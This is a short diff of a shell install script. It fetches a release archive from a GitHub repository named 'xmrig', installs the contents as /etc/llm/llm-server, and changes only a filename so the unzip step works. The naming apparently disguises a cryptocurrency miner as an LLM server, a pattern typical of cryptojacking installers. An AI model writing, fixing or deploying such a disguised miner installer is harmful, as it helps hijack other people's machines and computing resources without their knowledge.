@@ -27,7 +27,7 @@ else
 fi
 
 wget https://github.com/caippx/xmrig/releases/download/6.22.2/llm$param.zip 
-unzip llm.zip && rm -rf llm.zip
+unzip llm$param.zip && rm -rf llm$param.zip
 mkdir /etc/llm/
 mv llm /etc/llm/llm-server
 cd /etc/llm
